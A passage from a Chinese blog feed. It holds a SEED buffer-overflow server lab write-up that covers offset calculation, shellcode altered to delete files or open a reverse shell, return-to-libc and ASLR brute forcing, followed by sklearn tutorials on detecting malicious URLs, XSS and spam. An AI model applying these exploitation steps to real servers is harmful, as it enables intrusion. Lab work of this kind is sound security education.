class="shell">// Generate the shellcode binary$ ./shellcode_32.py ¨ generate codefile_32$ ./shellcode_64.py ¨ generate codefile_64// Compile call_shellcode.c$ make¨ generate a32.out and a64.out// Test the shellcode$ a32.out¨ execute the shellcode in codefile_32$ a64.out¨ execute the shellcode in codefile_64</code></pre><h4 id="任务：修改shellcode-32-py文件，使其能够删除文件。"><a href="#任务：修改shellcode-32-py文件，使其能够删除文件。" class="headerlink" title="任务：修改shellcode_32.py文件，使其能够删除文件。"></a>任务：修改shellcode_32.py文件，使其能够删除文件。</h4><p> <img src="/img/os_stackoverflow/image.png" alt="Alt text"></p><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>在该目录下创建文件task1，通过ls命令发现task1文件创建成功。<br> <img src="/img/os_stackoverflow/image-1.png" alt="Alt text"><br>可以看到执行a32.out文件后，通过ls命令发现task1文件被删除。<br> <img src="/img/os_stackoverflow/image-2.png" alt="Alt text"></p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>实验开发者在程序中添加了一点随机性，让不同学生可能看到不同的缓冲区地址和帧地址，为了让不同学生作业有些区别。但是这些值在容器启动后保持不变，因此只要不关闭容器每次实验结果仍然是相同的。</p><h1 id="三-实验任务"><a href="#三-实验任务" class="headerlink" title="三 实验任务"></a>三 实验任务</h1><h2 id="Task-1-Level-1-Attack"><a href="#Task-1-Level-1-Attack" class="headerlink" title="Task 1: Level-1 Attack"></a>Task 1: Level-1 Attack</h2><p>运行level-1漏洞程序的容器是10.9.0.5，端口是9090，漏洞程序是32位。</p><h3 id="获取server的堆栈信息"><a href="#获取server的堆栈信息" class="headerlink" title="获取server的堆栈信息"></a>获取server的堆栈信息</h3><p>先向服务器发送一条正常消息获取堆栈信息。</p><p><img src="/img/os_stackoverflow/image-3.png" alt="Alt text"></p><p>Buf基地址为：0xffffd598</p><p>Ebp地址为：0xffffd608</p><h3 id="编写exploit-py文件"><a href="#编写exploit-py文件" class="headerlink" title="编写exploit.py文件"></a>编写exploit.py文件</h3><p>在32位环境下，ret地址为ebp地址+4（单位为字节），已知buf基地址，则偏移量为ebp地址+4-buf基地址。</p><p>ret的值存储指令地址，要执行shellcode，因此要将ret指向shellcode地址。而shellcode使用了Nop填充，所以ret指向ret+4即可空转跳转到shellcode。<br><img src="/img/os_stackoverflow/image-4.png" alt="Alt text"></p><h3 id="生成badfile，获取服务器权限"><a href="#生成badfile，获取服务器权限" class="headerlink" title="生成badfile，获取服务器权限"></a>生成badfile，获取服务器权限</h3><p> <img src="/img/os_stackoverflow/image-5.png" alt="Alt text"></p><h2 id="Task-3-Level-2-Attack"><a href="#Task-3-Level-2-Attack" class="headerlink" title="Task 3: Level-2 Attack"></a>Task 3: Level-2 Attack</h2><h3 id="attack-code传入hello，获取server堆栈信息。"><a href="#attack-code传入hello，获取server堆栈信息。" class="headerlink" title="attack-code传入hello，获取server堆栈信息。"></a>attack-code传入hello，获取server堆栈信息。</h3><p> <img src="/img/os_stackoverflow/image-6.png" alt="Alt text"><br>Buf基地址：0xffffd548<br>Ebp地址：由于buf大小在100-300字节，因此ebp地址在buf基地址+100到buf基地址+300之间。</p><h3 id="编写exploit-py文件。"><a href="#编写exploit-py文件。" class="headerlink" title="编写exploit.py文件。"></a>编写exploit.py文件。</h3><p>Ret地址等于ebp地址+4，因此ret地址可能在buf基地址+104到buf基地址+304之间，所以offset的值可能在104到304之间。将这段content都填入ret指向地址即可。<br>Ret的值需要指向shellcode，而buf大小不确定，因此ret指向地址必须大于buf最大值+8，以执行ret上方的shellcode，避免从下面空转到ret陷入循环。<br> <img src="/img/os_stackoverflow/image-7.png" alt="Alt text"></p><h3 id="生成badfile，获取服务器权限。"><a href="#生成badfile，获取服务器权限。" class="headerlink" title="生成badfile，获取服务器权限。"></a>生成badfile，获取服务器权限。</h3><h2 id="4-Task4-Level-3-Attack"><a href="#4-Task4-Level-3-Attack" class="headerlink" title="4. Task4 Level-3 Attack"></a>4. Task4 Level-3 Attack</h2><h3 id="attack-code传入hello获取server堆栈信息。"><a href="#attack-code传入hello获取server堆栈信息。" class="headerlink" title="attack-code传入hello获取server堆栈信息。"></a>attack-code传入hello获取server堆栈信息。</h3><p> <img src="/img/os_stackoverflow/image-8.png" alt="Alt text"><br>Rbp指针：0x00007fffffffe540<br>Buf基地址：0x00007fffffffe470</p><h3 id="编写exploit-py文件。-1"><a href="#编写exploit-py文件。-1" class="headerlink" title="编写exploit.py文件。"></a>编写exploit.py文件。</h3><p>首先插入64位的shellcode，并把执行命令改为反弹shell。<br>start的值设置为0，此时shellcode在content头部，位置为content[0,len(shellcode)]。<br>Ret地址为rbp地址+8（64位环境），offset的值为ret地址-buf基地址。<br>ret的值指向shellcode地址，此时shellcode代码在content头部，即buf基地址0x470。<br> <img src="/img/os_stackoverflow/image-9.png" alt="Alt text"></p><h3 id="生成badfile，获取服务器权限-1"><a href="#生成badfile，获取服务器权限-1" class="headerlink" title="生成badfile，获取服务器权限"></a>生成badfile，获取服务器权限</h3><p> <img src="/img/os_stackoverflow/image-10.png" alt="Alt text"></p><h2 id="5-Task5-Level-4-Attack"><a href="#5-Task5-Level-4-Attack" class="headerlink" title="5. Task5 Level-4 Attack"></a>5. Task5 Level-4 Attack</h2><h3 id="attack-code传入hello，获取server堆栈信息。-1"><a href="#attack-code传入hello，获取server堆栈信息。-1" class="headerlink" title="attack-code传入hello，获取server堆栈信息。"></a>attack-code传入hello，获取server堆栈信息。</h3><p> <img src="/img/os_stackoverflow/image-11.png" alt="Alt text"><br>Rbp指针：0x00007fffffffe540<br>Buf基地址：0x00007fffffffe470</p><h3 id="编写exploit-py文件-1"><a href="#编写exploit-py文件-1" class="headerlink" title="编写exploit.py文件"></a>编写exploit.py文件</h3><p>相比于上一个task，这个task实行shellcode依靠于Return-to-libc，因此需要改变ret指向地址。<br>        经过尝试以后，ret为rbp+1400的时候能够实现反弹shell。<br><img src="/img/os_stackoverflow/image-12.png" alt="Alt text"> </p><h3 id="生成badfile，获取服务器权限。-1"><a href="#生成badfile，获取服务器权限。-1" class="headerlink" title="生成badfile，获取服务器权限。"></a>生成badfile，获取服务器权限。</h3><p> <img src="/img/os_stackoverflow/image-13.png" alt="Alt text"></p><h2 id="6-Task6-Level-5-Attack"><a href="#6-Task6-Level-5-Attack" class="headerlink" title="6. Task6 Level-5 Attack"></a>6. Task6 Level-5 Attack</h2><h3 id="打开地址随机化。"><a href="#打开地址随机化。" class="headerlink" title="打开地址随机化。"></a>打开地址随机化。</h3><p> <img src="/img/os_stackoverflow/image-14.png" alt="Alt text"></p><h3 id="attack-code传入hello，获取server堆栈信息。-2"><a href="#attack-code传入hello，获取server堆栈信息。-2" class="headerlink" title="attack-code传入hello，获取server堆栈信息。"></a>attack-code传入hello，获取server堆栈信息。</h3><p>可以发现随着地址随机化的打开，server堆栈地址发生改变。<br> <img src="/img/os_stackoverflow/image-15.png" alt="Alt text"><br> <img src="/img/os_stackoverflow/image-16.png" alt="Alt text"></p><h3 id="编写exploit-py文件。-2"><a href="#编写exploit-py文件。-2" class="headerlink" title="编写exploit.py文件。"></a>编写exploit.py文件。</h3><p> <img src="/img/os_stackoverflow/image-17.png" alt="Alt text"></p><h3 id="生成badfile，运行脚本brute-force-sh不断向server传入badfile。"><a href="#生成badfile，运行脚本brute-force-sh不断向server传入badfile。" class="headerlink" title="生成badfile，运行脚本brute-force.sh不断向server传入badfile。"></a>生成badfile，运行脚本brute-force.sh不断向server传入badfile。</h3><p>当server程序满足badfile的堆栈条件时，脚本停止，成功获取服务器权限。<br> <img src="/img/os_stackoverflow/image-18.png" alt="Alt text"><br> <img src="/img/os_stackoverflow/image-19.png" alt="Alt text"><br> <img src="/img/os_stackoverflow/image-20.png" alt="Alt text"></p><h2 id="7-Task7-Level-6-Attack"><a href="#7-Task7-Level-6-Attack" class="headerlink" title="7.Task7 Level-6 Attack"></a>7.Task7 Level-6 Attack</h2><h3 id="在server-code目录下："><a href="#在server-code目录下：" class="headerlink" title="在server-code目录下："></a>在server-code目录下：</h3><p>去除-fon-stack-protector选项（即打开栈保护机制）编译stack.c，将badfile输入。<br>Server成功检测到stack smashing（堆栈溢出漏洞）<br> <img src="/img/os_stackoverflow/image-21.png" alt="Alt text"></p><h3 id="在shellcode目录下："><a href="#在shellcode目录下：" class="headerlink" title="在shellcode目录下："></a>在shellcode目录下：</h3><p>去除-z execstack（这个选项会认为栈空间的指令可以被执行，因此我们才能之前的实验运行栈溢出的shellcode和空转指令）编译call_shellcode.c编译并运行。<br><img src="/img/os_stackoverflow/image-22.png" alt="Alt text"></p>]]></content>
      
      
      <categories>
          
          <category> SEED </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEED </tag>
            
            <tag> Buffer Overflow Attack Lab (Server Version) </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>恶意URL检测</title>
      <link href="/posts/ml_maliciousurl/"/>
      <url>/posts/ml_maliciousurl/</url>
      
        <content type="html"><![CDATA[<h1 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h1><pre><code class="python"># 数据提取&amp;处理（csv）import pandas as pdfrom sklearn.utils import shuffle# 特征提取import refrom sklearn.feature_extraction.text import TfidfVectorizer# 训练集和测试集划分from sklearn.model_selection import train_test_split# 逻辑回归算法训练模型from sklearn.linear_model import LogisticRegression# 模型评估报告打印from sklearn.metrics import classification_report# 模型保存import pickledef read_dmoz0409(file_path, lable):    normal_pd = pd.read_csv(file_path, header=None, names=[&quot;url&quot;], usecols=[1], nrows=14989)    normal_pd[&quot;lable&quot;] = lable    # print(normal_pd)    return normal_pddef read_phishing_verified_online(file_path, lable):    malicious_pd = pd.read_csv(file_path, usecols=[1], nrows=14989)    malicious_pd[&quot;lable&quot;] = lable    # print(malicious_pd)    return malicious_pddef data_process(normal, malicious):    all = pd.concat([normal, malicious])    data = all[&quot;url&quot;]    lable = all[&quot;lable&quot;]    data, lable = shuffle(data, lable, random_state=42)    return data, labledef data_tokenizer(data):    return re.findall(r&#39;\w+&#39;, data)def data_vectorizer(data, lable):    vectorizer = TfidfVectorizer(tokenizer=data_tokenizer)    x = vectorizer.fit_transform(data)    y = lable    return x, y, vectorizerdef model_train(x_train, y_train):    model = LogisticRegression()    model.fit(x_train, y_train)    return modeldef model_test(model, x_test, y_test):    # accuracy = model.score(x_test, y_test)    # print(&quot;模型准确率:&quot;, accuracy)    y_predict = model.predict(x_test)    report = classification_report(y_test, y_predict, labels=[&quot;malicious&quot;, &quot;normal&quot;], target_names=[&quot;恶意URL&quot;, &quot;正常URL&quot;],digits=2)    return reportdef model_save(model, vectorizer, report):    save = input(&quot;是否保存训练的模型（y/n）：&quot;)    if save == &quot;y&quot; or save == &quot;Y&quot;:        with open(&#39;model.pkl&#39;, &#39;wb&#39;) as f:            pickle.dump(model, f)        with open(&#39;vectorizer.pkl&#39;, &#39;wb&#39;) as f:            pickle.dump(vectorizer, f)        with open(&#39;report.txt&#39;, &#39;w&#39;) as f:            f.write(report)        print(&quot;保存成功！&quot;)        return True    else:        return Falsedef new_model():    # 数据提取    print(&quot;数据提取...&quot;)    normal = read_dmoz0409(&quot;dmoz0409.csv&quot;, &quot;normal&quot;)    malicious = read_phishing_verified_online(&quot;phishing_verified_online.csv&quot;, &quot;malicious&quot;)    # 数据处理（合并，打乱数据集）    print(&quot;数据处理...&quot;)    data, lable = data_process(normal, malicious)    # 特征提取    print(&quot;向量化...&quot;)    x, y, vectorizer = data_vectorizer(data, lable)    # print(vectorizer.vocabulary_)    # print(x.toarray)    # 数据集划分    x_train, x_test, y_train, y_test = train_test_split(x, y, test_size=0.3)    # 模型训练    print(&quot;模型训练...&quot;)    model = model_train(x_train, y_train)    # 模型评估    report = model_test(model, x_test, y_test)    print(&quot;模型评估报告：&quot; + &quot;\n&quot;, report)    # 模型保存?    model_save(model, vectorizer, report)def use_model():    while True:        url_list = input(&quot;输入需要测试的url：&quot;).split(&quot;\n&quot;)        with open(&quot;vectorizer.pkl&quot;, &quot;rb&quot;) as f:            vectorizer = pickle.load(f)        x = vectorizer.transform(url_list)        with open(&quot;model.pkl&quot;, &quot;rb&quot;) as f:            model = pickle.load(f)        y_predict = model.predict(x)        for i in range(len(url_list)):            print(url_list[i], y_predict[i])if __name__ == &quot;__main__&quot;:    choice = input(&quot;训练新的模型或是使用已经训练的模型（train/use）：&quot;)    if choice == &quot;train&quot;:        new_model()    elif choice==&quot;use&quot;:        print(&quot;-------恶意URL检测-------&quot;)        use_model()    else:        print(&quot;无效的输入！&quot;)</code></pre>]]></content>
      
      
      <categories>
          
          <category> ML </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AI </tag>
            
            <tag> 人工智能 </tag>
            
            <tag> 机器学习 </tag>
            
            <tag> Python </tag>
            
            <tag> sklearn </tag>
            
            <tag> url </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>机器学习</title>
      <link href="/posts/ml_pre/"/>
      <url>/posts/ml_pre/</url>
      
        <content type="html"><![CDATA[<h1 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a>机器学习</h1><p>在很多场景，</p><h2 id="分类-回归"><a href="#分类-回归" class="headerlink" title="分类&amp;回归"></a>分类&amp;回归</h2><p>简单来说，分类解决离散问题；回归解决连续问题。</p><p>分类（Binary Classification）：一个例子，对于给定的一个字符串，检测是否为恶意的，那么这种就是分类问题，一般来说二分类问题比较常见。</p><p>回归（Regression）：给定一个人的各方面信息，评估他的个人收入，他的收入显然是有大量可能的，因此这是回归问题。</p><h2 id="分类模型"><a href="#分类模型" class="headerlink" title="分类模型"></a>分类模型</h2><h3 id="线性回归"><a href="#线性回归" class="headerlink" title="线性回归"></a>线性回归</h3><h2 id="回归模型"><a href="#回归模型" class="headerlink" title="回归模型"></a>回归模型</h2><h3 id="Logist回归"><a href="#Logist回归" class="headerlink" title="Logist回归"></a>Logist回归</h3><h3 id="朴素贝叶斯"><a href="#朴素贝叶斯" class="headerlink" title="朴素贝叶斯"></a>朴素贝叶斯</h3><p><a href="https://zhuanlan.zhihu.com/p/26262151">了解更多</a></p><h3 id="决策树"><a href="#决策树" class="headerlink" title="决策树"></a>决策树</h3><h2 id="机器学习一般步骤："><a href="#机器学习一般步骤：" class="headerlink" title="机器学习一般步骤："></a>机器学习一般步骤：</h2><ul><li>文件读取</li><li>数据处理</li><li>特征提取&amp;向量化</li><li>训练集&amp;测试集划分</li><li>模型训练</li><li>模型测试</li><li>模型保存</li><li>模型使用</li></ul><h3 id="1-文件读取"><a href="#1-文件读取" class="headerlink" title="1. 文件读取"></a>1. 文件读取</h3><p>一般来说，数据集存储在txt或者csv文件中，它包括数据和标签两个部分。</p><p>需要注意的是数据集的并没有统一格式，需要根据具体情况便携代码。</p><p>首先将其读入程序，以便我们能够处理，可以将其读入列表，字典或者pd对象当中。</p><p>下面提供pandas读取csv文件的代码，并将数据集存储到pd对象中：</p><pre><code class="python">def read_file(file_path):    file_pd = pd.read_csv(file_path, usecols=[&quot;data&quot;,&quot;lable&quot;])    return file_pd</code></pre><ul><li>程序数据处理</li></ul><pre><code class="Python">def data_process(normal, malicious):    all = pd.concat([normal, malicious])    data = all[&quot;data&quot;]    lable = all[&quot;lable&quot;]    data, lable = shuffle(data, lable, random_state=42)    return data, labledata, lable = data_process(normal, malicious)</code></pre><ul><li>特征向量</li></ul><pre><code class="Python">def data_tokenizer(data):    return re.findall(r&#39;\w+&#39;, data)def data_vectorizer(data, lable):    vectorizer = TfidfVectorizer(stop_words=None, tokenizer=data_tokenizer)    x = vectorizer.fit_transform(data)    y = lable    return x, y, vectorizer</code></pre><ul><li>训练集&amp;测试集</li></ul><pre><code class="Python">    x_train, x_test, y_train, y_test = train_test_split(x, y, test_size=0.3)</code></pre><ul><li>模型训练</li></ul><pre><code class="Python">def model_train(x_train, y_train):    # 在这里选择适合适的模型    model = modelname()    model.fit(x_train, y_train)    return model</code></pre><ul><li>模型测试</li></ul><pre><code class="Python">def model_test(model, x_test, y_test):    y_predict = model.predict(x_test)    report = classification_report(y_test, y_predict, labels=[&quot;malicious&quot;, &quot;normal&quot;], target_names=[&quot;恶意URL&quot;, &quot;正常URL&quot;],digits=2)    return report</code></pre><ul><li>优化</li></ul>]]></content>
      
      
      <categories>
          
          <category> ML </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
            <tag> Python </tag>
            
            <tag> sklearn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS注入检测</title>
      <link href="/posts/ml_xss/"/>
      <url>/posts/ml_xss/</url>
      
        <content type="html"><![CDATA[<h1 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h1><p><em><strong>pd对象和python字典类似，行为属性，列为列表</strong></em></p><h3 id="pd-read-csv-函数："><a href="#pd-read-csv-函数：" class="headerlink" title="pd.read_csv()函数："></a>pd.read_csv()函数：</h3><ul><li>参数header：pandas是否选择csv文件第一行作为列名</li><li>参数usecols：pandas读取csv文件列</li></ul><h3 id="pd-to-csv-函数："><a href="#pd-to-csv-函数：" class="headerlink" title="pd.to_csv()函数："></a>pd.to_csv()函数：</h3><ul><li>参数header：pandas是否将属性名写入csv文件</li><li>参数columns：pandas写入csv文件的属性（<em>影响写入的顺序</em>）</li><li>参数index：pandas是否写入序号</li></ul><pre><code class="python"># 数据提取&amp;处理import pandas as pdfrom sklearn.utils import shuffle# 特征提取import refrom sklearn.feature_extraction.text import TfidfVectorizer# 训练集和测试集划分from sklearn.model_selection import train_test_split# 逻辑回归算法训练模型from sklearn.linear_model import LogisticRegression# 模型评估报告打印from sklearn.metrics import classification_report# 模型保存import pickledef read_csv(file_path, lable):    data = pd.read_csv(file_path, header=None, names=[&quot;str&quot;], usecols=[0])    data[&quot;lable&quot;] = lable    return data# normal = read_csv(&quot;dmzo_nomal.csv&quot;, &quot;normal&quot;)# xss = read_csv(&quot;xssed.csv&quot;, &quot;xss&quot;)def data_process(normal, xss):    all = pd.concat([normal, xss])    data = all[&quot;str&quot;]    lable = all[&quot;lable&quot;]    data, lable = shuffle(data, lable, random_state=42)    return data, lable# data ,lable = data_process(normal, xss)def data_tokenizer(data):    return re.findall(r&#39;\w+&#39;, data)def data_vectorizer(data,lable):    vectorizer = TfidfVectorizer(tokenizer=data_tokenizer)    x = vectorizer.fit_transform(data)    y = lable    return x, y, vectorizer# x, y ,vectorizer = data_vectorizer(data, lable)# x_train, x_test, y_train, y_test = train_test_split(x, y, test_size=0.3)def model_train(x_train, y_train):    model = LogisticRegression()    model.fit(x_train, y_train)    return model# model = model_train(x_train, y_train)def model_evaluate(x_test,y_test):    y_predict = model.predict(x_test)    report = classification_report(y_test, y_predict, labels=[&quot;xss&quot;, &quot;normal&quot;], target_names=[&quot;xss字符串&quot;, &quot;正常字符串&quot;],digits=2)    return report# report = model_evaluate(x_test, y_test)# print(report)def model_save(model, vectorizer):    save = input(&quot;是否保存训练的模型（y/n）：&quot;)    if save == &quot;y&quot; or &quot;Y&quot;:        print(save)        with open(&#39;model.pkl&#39;, &#39;wb&#39;) as f:            pickle.dump(model, f)        with open(&#39;vectorizer.pkl&#39;, &#39;wb&#39;) as f:            pickle.dump(vectorizer, f)        print(&quot;保存成功！&quot;)        return True    else:        return False# model_save(model, vectorizer)if __name__ == &quot;__main__&quot;:    print(&quot;-------XSS检测-------&quot;)    while True:        with open(&quot;model.pkl&quot;, &#39;rb&#39;) as f:            model = pickle.load(f)        with open(&#39;vectorizer.pkl&#39;, &#39;rb&#39;) as f:            vectorizer = pickle.load(f)        str_list = input(&quot;输入需要检测的字符串:&quot;).split(&quot;\n&quot;)        x = vectorizer.transform(str_list)        y_predict = model.predict(x)        print(&quot;检测结果为：&quot;,y_predict)</code></pre>]]></content>
      
      
      <categories>
          
          <category> ML </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AI </tag>
            
            <tag> 人工智能 </tag>
            
            <tag> 机器学习 </tag>
            
            <tag> Python </tag>
            
            <tag> sklearn </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>垃圾邮件检测</title>
      <link href="/posts/ml_spam/"/>
      <url>/posts/ml_spam/</url>
      
        <content type="html"><![CDATA[<h2 id="1-数据集"><a href="#1-数据集" class="headerlink" title="1. 数据集"></a>1. 数据集</h2><h3 id="tre06c"><a href="#tre06c" class="headerlink" title="tre06c"></a>tre06c</h3><p>tre06c&#x2F;data：邮件数据，包括真实世界的正常邮件和垃圾邮件</p><p>tre06c&#x2F;full：标签</p><h2 id="2-数据提取-处理"><a href="#2-数据提取-处理" class="headerlink" title="2. 数据提取&amp;处理"></a>2. 数据提取&amp;处理</h2><p><em><strong><a href="https://github.com/fxsjy/jieba/blob/master/README.md">jieba官方文档</a></strong></em></p><p><em><strong>列表推导式（expression for li in list if condition）</strong></em></p><h3 id="读取邮件数据"><a href="#读取邮件数据" class="headerlink" title="读取邮件数据"></a>读取邮件数据</h3><p>递归读取目录trec06c&#x2F;data的文件，获取邮件数据并进行分词处理，返回处理后的邮件列表。</p><pre><code class="python"># 读取邮件数据def read_file(file_path):    # print(file_path)    email_list = []    files = os.listdir(file_path)    for file in files:        if os.path.isdir(file_path + &#39;/&#39; + file):            email_list = email_list + read_file(file_path + &#39;/&#39; + file)        else:            with open(file_path + &#39;/&#39; + file, &#39;r&#39;, encoding=&#39;gbk&#39;, errors=&#39;ignore&#39;) as f:                email = f.read()            # 替换非汉字字符            email = re.sub(r&quot;[^\u4e00-\u9fff]&quot;, &quot; &quot;, email)            # 替换连续的空格            email = re.sub(r&quot;\s&#123;2,&#125;&quot;, &quot; &quot;, email)            # 去除首尾的空格            email = email.strip()            # 结巴分词            email = [word for word in jieba.lcut(email) if word.strip() != &#39; &#39;]            email = &#39; &#39;.join(email)            email_list.append(email)    return email_list# email = read_file(&quot;trec06c/data&quot;)</code></pre><h3 id="读取标签数据"><a href="#读取标签数据" class="headerlink" title="读取标签数据"></a>读取标签数据</h3><p>读取文件trec06c&#x2F;full&#x2F;index，获取邮件标签列表。</p><pre><code class="python"># 读取标签数据def read_lable(file_path):    lable = []    with open(file_path, &quot;r&quot;) as f:        for l in f.readlines():            if &quot;s&quot; in l:                lable.append(&quot;spam&quot;)            else:                lable.append(&quot;ham&quot;)    return lable# lable = read_lable(&quot;trec06c/full/index&quot;)</code></pre><h3 id="打乱数据顺序"><a href="#打乱数据顺序" class="headerlink" title="打乱数据顺序"></a>打乱数据顺序</h3><pre><code class="python">def data_process(email, lable):    email, lable = shuffle(email, lable, random_state=42)    return email, lable# email, lable = data_process(email, lable)</code></pre><h2 id="3-词云"><a href="#3-词云" class="headerlink" title="3. 词云"></a>3. 词云</h2><p>随便写写，感觉词云有一些bug，同一个词重复出现</p><pre><code class="python"># 词云def word_cloud(text):    wc = WordCloud(        background_color = &quot;white&quot;,        max_words = 200,        # 可以使用其他字体        # 但是如果无法正常显示，需要更换字体        font_path = &quot;C:\Windows\Fonts\SIMYOU.ttf&quot;,        min_font_size = 15,        max_font_size = 50,        width = 600    )    wordcloud = wc.generate(text)    wordcloud.to_file(&#39;jieba.jpg&#39;)with open(&#39;./jieba.txt&#39;, &#39;r&#39;, encoding=&#39;utf-8&#39;) as f:    txt = f.readlines()showWordCloud(&#39; &#39;.join(txt))</code></pre><p>全部邮件词云：</p><p><img src="/img/ai_spamdetection/email.jpg" alt="Alt text"></p><pre><code class="python">spam_list = []ham_list = []with open(&quot;./full.txt&quot;, &quot;r&quot;, encoding=&#39;utf-8&#39;) as f:    tag_list = f.readlines()    with open(&quot;./jb.txt&quot;, &quot;r&quot;, encoding=&quot;utf-8&quot;) as g:        email_list = g.readlines()        i = 0        for tag in tag_list:            if tag[0] == &#39;1&#39;:                spam = email_list[i]                spam_list.append(spam)            elif tag[0] == &#39;0&#39;:                ham = email_list[i]                ham_list.append(ham)            i = i + 1</code></pre><p>垃圾邮件词云：</p><p><img src="/img/ai_spamdetection/ham.jpg" alt="Alt text"></p><p>正常邮件词云：</p><p><img src="/img/ai_spamdetection/spam.jpg" alt="Alt text"></p><h2 id="4-特征提取"><a href="#4-特征提取" class="headerlink" title="4. 特征提取"></a>4. 特征提取</h2><pre><code class="python">def data_vectorizer(email,lable):    # 邮件样本已经分好了词，词之间用空格隔开，所以 tokenizer=tokenizer_space    vectoring = TfidfVectorizer(input=&#39;content&#39;, analyzer=&#39;word&#39;)    x = vectoring.fit_transform(email)    y = lable    return x, y, vectoring# x, y, vectorizer = data_vectorizer(email, lable)</code></pre><h2 id="5-换分数据集"><a href="#5-换分数据集" class="headerlink" title="5. 换分数据集"></a>5. 换分数据集</h2><pre><code class="python"># x_train, x_test, y_train, y_test = train_test_split(x, y, test_size=0.3)</code></pre><h2 id="6-模型训练"><a href="#6-模型训练" class="headerlink" title="6. 模型训练"></a>6. 模型训练</h2><pre><code class="python">def model_train(x_train, y_train):    model = svm.LinearSVC()    model.fit(x_train, y_train)    return model# model = model_train(x_train, y_train)</code></pre><h2 id="7-模型测试"><a href="#7-模型测试" class="headerlink" title="7. 模型测试"></a>7. 模型测试</h2><pre><code class="python">def model_test(x_test, y_test):    y_pred = model.predict(x_test)    report = classification_report(y_test, y_pred, digits=2)    return report# report = model_test(model)</code></pre><h2 id="8-模型保存"><a href="#8-模型保存" class="headerlink" title="8. 模型保存"></a>8. 模型保存</h2><pre><code class="python">def model_save(model,vectorizer,report):    save = input(&quot;是否保存训练的模型（y/n）：&quot;)    if save == &quot;y&quot; or &quot;Y&quot;:        with open(&#39;model.pkl&#39;, &#39;wb&#39;) as f:            pickle.dump(model, f)        with open(&#39;vectorizer.pkl&#39;, &#39;wb&#39;) as f:            pickle.dump(vectorizer, f)        with open(&#39;report.txt&#39;, &#39;w&#39;) as f:            f.write(report)        print(&quot;保存成功！&quot;)        return True    else:        return False# model_save(model, vectorizer, report)</code></pre><h2 id="9-模型使用"><a href="#9-模型使用" class="headerlink" title="9. 模型使用"></a>9. 模型使用</h2><pre><code class="python">if __name__ == &quot;__main__&quot;:    print(&quot;-------垃圾邮件检测-------&quot;)    while True:        with open(&quot;model.pkl&quot;, &#39;rb&#39;) as f:            model = pickle.load(f)        with open(&#39;vectorizer.pkl&#39;, &#39;rb&#39;) as f:            vectorizer = pickle.load(f)        file_path = input(&quot;输入需要检测的邮件文件的路径:&quot;)        with open(file_path, &quot;r&quot;, encoding=&quot;gbk&quot;, errors=&quot;ignore&quot;) as f:            email = f.read()        email_list = [email]        print(email)        x = vectorizer.transform(email_list)        y_predict = model.predict(x)        print(&quot;检测结果为：&quot;, y_predict[0])</code></pre><h2 id="源代码-数据集"><a href="#源代码-数据集" class="headerlink" title="源代码&amp;数据集"></a>源代码&amp;数据集</h2><p>注释的代码用于生成模型。</p><p>如果已经生成了模型，main函数用于调用模型检测邮件。</p><pre><code class="python"># 数据提取import os# 数据处理from sklearn.utils import shuffleimport reimport jieba# 提取特征from sklearn.feature_extraction.text import TfidfVectorizer# 划分训练集，测试集from sklearn.model_selection import train_test_split# 训练模型from sklearn import svm# 模型评估报告from sklearn import metrics# 模型保存import pickle# # 递归读取文件夹内所有文件# def list_file(file_path):#     file_list = []#     files = os.listdir(file_path)#     for file in files:#         if os.path.isdir(file_path + &#39;/&#39; + file):#             file_list = file_list + list_file(file_path + &#39;/&#39; + file)#         else:#             file_list.append(file_path + &#39;/&#39; + file)##     return file_list# # 读取邮件数据# def read_email(file_list):#     email = []#     for file in file_list:#         with open(file, &quot;r&quot;, encoding=&#39;gbk&#39;, errors=&#39;ignore&#39;) as f:#             email = email + f.readlines()##     return email# 读取邮件数据def read_file(file_path):    # print(file_path)    email_list = []    files = os.listdir(file_path)    for file in files:        if os.path.isdir(file_path + &#39;/&#39; + file):            email_list = email_list + read_file(file_path + &#39;/&#39; + file)        else:            with open(file_path + &#39;/&#39; + file, &#39;r&#39;, encoding=&#39;gbk&#39;, errors=&#39;ignore&#39;) as f:                email = f.read()            # 替换连续的空格            email = re.sub(r&quot;[^\u4e00-\u9fff]&quot;, &quot; &quot;, email)            # 替换非汉字字符            email = re.sub(r&quot;\s&#123;2,&#125;&quot;, &quot; &quot;, email)            # 去除首尾的空格            email = email.strip()            # 结巴分词            email = [word for word in jieba.lcut(email) if word.strip() != &#39; &#39;]            email = &#39; &#39;.join(email)            email_list.append(email)    return email_list# email = read_file(&quot;trec06c/data&quot;)# 读取标签数据def read_lable(file_path):    lable = []    with open(file_path, &quot;r&quot;) as f:        for l in f.readlines():            if &quot;s&quot; in l:                lable.append(&quot;spam&quot;)            else:                lable.append(&quot;ham&quot;)    return lable# lable = read_lable(&quot;trec06c/full/index&quot;)# 数据处理def data_process(email, lable):    email, lable = shuffle(email, lable, random_state=42)    return email, lable# email, lable = data_process(email, lable)# 特征提取def data_vectorizer(email,lable):    # 邮件样本已经分好了词，词之间用空格隔开，所以 tokenizer=tokenizer_space    vectoring = TfidfVectorizer(input=&#39;content&#39;, analyzer=&#39;word&#39;)    x = vectoring.fit_transform(email)    y = lable    return x, y, vectoring# x, y, vectorizer = data_vectorizer(email, lable)# 划分训练集和测试集# x_train, x_test, y_train, y_test = train_test_split(x, y, test_size=0.3)def model_train(x_train, y_train):    model = svm.LinearSVC()    model.fit(x_train, y_train)    return model# model = model_train(x_train, y_train)def model_test(x_test, y_test):    y_pred = model.predict(x_test)    print(&quot;模型评估报告：\n&quot;, metrics.classification_report(y_test, y_pred, digits=2))# model_test(model)def model_save(model, vectorizer):    save = input(&quot;是否保存训练的模型（y/n）：&quot;)    if save == &quot;y&quot; or &quot;Y&quot;:        with open(&#39;model.pkl&#39;, &#39;wb&#39;) as f:            pickle.dump(model, f)        with open(&#39;vectorizer.pkl&#39;, 